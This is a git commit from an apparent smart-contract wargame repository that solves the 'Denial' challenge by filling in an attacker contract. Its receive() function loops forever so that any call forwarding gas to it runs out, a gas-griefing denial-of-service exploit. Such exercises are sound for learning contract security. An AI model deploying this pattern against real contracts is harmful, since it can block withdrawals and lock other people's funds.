2d0c49fbabcad662874a4d06075b8f6cc6ca2f3e
Rares Stanciu <rares.stanciu@outlook.com>
2022-05-04 23:38:17 +0300

    feat: solve Denial

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -9,5 +9,11 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        // We can spend all the remaining gas by looping indefinitely
+        // until the transaction will run out of gas.
+        do {
+            this;
+        } while (true);
+    }
 }
